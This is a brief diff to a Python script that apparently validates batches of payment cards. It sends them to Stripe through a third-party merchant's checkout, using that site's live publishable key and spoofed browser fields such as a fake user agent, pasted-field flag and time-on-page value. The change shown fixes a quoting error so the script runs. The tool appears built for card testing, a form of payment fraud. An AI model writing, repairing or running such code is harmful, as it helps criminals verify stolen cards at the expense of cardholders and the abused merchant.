@@ -106,7 +106,7 @@ async def ppc(cards, card_num, total_cards):
             "billing_details[name]": "Test User",
             "pasted_fields": "number",
             "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
-            "referrer": https://dainte.com,
+            "referrer": "https://dainte.com",
             "time_on_page": "187650",
             "key": PK,
             "_stripe_version": "2024-06-20",
@@ -236,4 +236,5 @@ async def main():
 if __name__ == "__main__":
     DOMAIN = "https://dainte.com"
     PK = "pk_live_51F0CDkINGBagf8ROVbhXA43bHPn9cGEHEO55TN2mfNGYsbv2DAPuv6K0LoVywNJKNuzFZ4xGw94nVElyYg1Aniaf00QDrdzPhf"
+
     asyncio.run(main())
